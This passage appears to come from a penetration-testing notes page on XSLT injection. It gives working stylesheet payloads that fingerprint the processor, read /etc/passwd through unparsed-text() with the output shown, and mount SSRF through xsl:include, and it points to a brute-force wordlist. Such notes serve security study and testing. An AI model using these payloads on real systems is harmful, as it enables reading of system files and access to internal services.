      <h2>My CD Collection</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>Artist</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Bob Dylan</td>
         </tr>
      </table>
   </body>
</html>
```

With the following file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```

```console
zero@pio$ saxonb-xslt -xsl:detection.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```

To read files:
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

```console
zero@pio$ saxonb-xslt -xsl:readfile.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>
```

We can also mount SSRF attacks if we have control over the transformation:
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

We can use these [wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt) to brute force it.

